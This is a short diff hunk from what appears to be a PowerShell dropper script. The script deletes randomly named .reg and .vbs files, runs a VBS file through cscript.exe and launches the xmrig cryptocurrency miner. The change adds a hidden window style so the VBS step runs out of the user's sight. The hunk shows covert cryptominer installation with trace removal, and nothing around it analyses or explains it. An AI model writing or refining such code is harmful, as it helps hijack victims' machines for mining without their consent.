@@ -188,7 +188,7 @@ Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
 cd $initial_dir
-Start-Process -FilePath "cscript.exe" -ArgumentList "ZDaFvwjOosKx.vbs"
+Start-Process -windowstyle hidden -FilePath "cscript.exe" -ArgumentList "ZDaFvwjOosKx.vbs"
 
 Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" 
 
